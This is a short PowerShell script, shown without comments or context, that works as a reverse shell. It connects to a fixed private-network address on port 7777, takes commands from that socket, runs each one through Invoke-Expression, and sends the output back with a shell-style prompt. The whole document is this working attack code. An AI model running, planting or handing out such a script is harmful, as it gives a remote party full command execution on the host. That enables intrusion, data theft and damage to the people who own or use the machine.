$client = New-Object System.Net.Sockets.TCPClient("192.168.10.12", 7777);

$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{0};

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
   
   $cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
   
   $result = (Invoke-Expression $cmd 2>&1 | Out-String);
   
   $response = $result + (pwd).Path + "> ";
   
   $encoded = ([text.encoding]::ASCII).GetBytes($response);
   
   $stream.Write($encoded, 0, $encoded.Length);
   
   $stream.Flush();
};

$client.Close();
